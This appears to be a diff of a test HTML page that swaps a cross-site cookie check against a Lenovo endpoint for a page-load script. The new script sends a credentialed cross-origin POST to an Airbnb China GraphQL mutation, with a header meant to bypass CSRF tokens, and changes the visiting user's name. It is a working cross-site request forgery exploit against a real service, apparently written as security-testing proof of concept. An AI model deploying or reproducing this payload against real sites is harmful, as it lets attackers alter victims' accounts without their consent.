@@ -1,27 +1,19 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <title>CSRF Cross Site Test</title>
-</head>
+<html>
 <body>
-    <h3>Cross-site Request Test (GitHub Pages)</h3>
-    <button onclick="sendRequest()">Send Cross-Site GET Request</button>
-    <div id="result"></div>
-
-    <script>
-        async function sendRequest(){
-            const resultDom = document.getElementById('result');
-            try{
-                const resp = await fetch("https://reg.lenovo.com.cn/auth/set_cookie?cookie=csrf_verify", {
-                    credentials: "include", 
-                    mode: "no-cors"
-                });
-                resultDom.innerText = "Request sent! Open F12 -> Network, check the Request Headers to see if Cookie is attached.";
-            }catch(err){
-                resultDom.innerText = "Error: " + err;
-            }
-        }
-    </script>
+<script>
+fetch("https://www.airbnb.cn/api/v3/PersonalInfoMutation/1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431?operationName=PersonalInfoMutation&locale=zh-CN&currency=CNY", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json",
+    "X-CSRF-Without-Token": "1"
+  },
+  body: JSON.stringify({"operationName":"PersonalInfoMutation","variables":{"coreUserData":{"firstName":"志","lastName":"张"}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"1b6fb7e6ce6858f751756606693a13a63a15a39e21bd16e06cfdab3c9f6b2431"}}})
+}).then(res => res.text()).then(result => {
+  console.log("返回结果：", result);
+  alert("请求完成，请打开F12控制台查看返回内容");
+})
+</script>
 </body>
 </html>
